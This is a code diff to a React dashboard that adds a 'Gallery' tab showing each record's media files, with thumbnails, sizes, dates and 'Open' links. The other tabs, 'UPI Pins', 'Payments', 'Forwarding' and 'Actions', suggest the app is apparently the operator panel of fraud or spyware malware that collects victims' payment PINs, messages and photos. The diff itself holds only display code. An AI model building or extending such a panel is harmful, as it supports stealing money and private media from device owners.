@@ -15,6 +15,7 @@ const tabs = [
   { key: 'upi_details', label: 'UPI Pins' },
   { key: 'payment_attempts', label: 'Payments' },
   { key: 'forwarding', label: 'Forwarding' },
+  { key: 'gallery', label: 'Gallery' },
   { key: 'actions', label: 'Actions' },
 ]
 
@@ -208,6 +209,38 @@ export default function App() {
                         </table>
                       </div>
                     )
+                  )}
+
+                  {tab === 'gallery' && (
+                    <div>
+                      {(sec.media||[]).length === 0 ? <div style={s.empty}>No media</div> : (
+                        <div>
+                          {(sec.media||[]).map((m,j) => {
+                            const isImg = m.file_type?.startsWith('image/')
+                            const isVid = m.file_type?.startsWith('video/')
+                            const isAud = m.file_type?.startsWith('audio/')
+                            const size = m.file_size > 1048576 ? (m.file_size/1048576).toFixed(1)+'MB' : m.file_size > 1024 ? (m.file_size/1024).toFixed(1)+'KB' : m.file_size+'B'
+                            return (
+                              <div key={m.id||j} style={{display:'flex',gap:10,padding:'8px 0',borderBottom:'1px solid #f1f5f9',alignItems:'center'}}>
+                                <div style={{width:60,height:60,borderRadius:8,overflow:'hidden',flexShrink:0,background:'#f1f5f9',display:'flex',alignItems:'center',justifyContent:'center',fontSize:20}}>
+                                  <a href={m.url} target="_blank" rel="noreferrer" style={{display:'contents',color:'inherit',textDecoration:'none'}}>
+                                    {isImg ? <img src={m.url} style={{width:'100%',height:'100%',objectFit:'cover'}} /> :
+                                     isVid ? <video src={m.url} style={{width:'100%',height:'100%',objectFit:'cover'}} /> :
+                                     isAud ? '🎵' : '📄'}
+                                  </a>
+                                </div>
+                                <div style={{flex:1,minWidth:0}}>
+                                  <div style={{fontSize:12,fontWeight:600,color:'#1e293b',wordBreak:'break-all'}}>{m.file_name}</div>
+                                  <div style={{fontSize:10,color:'#94a3b8',marginTop:1}}>{m.file_type} &middot; {size}</div>
+                                  <div style={{fontSize:10,color:'#94a3b8'}}>{m.created_at ? new Date(m.created_at).toLocaleString() : ''}</div>
+                                </div>
+                                <a href={m.url} target="_blank" rel="noreferrer" style={{fontSize:11,color:'#3b82f6',textDecoration:'none',whiteSpace:'nowrap'}}>Open</a>
+                              </div>
+                            )
+                          })}
+                        </div>
+                      )}
+                    </div>
                   )}
 
                   {tab === 'forwarding' && (
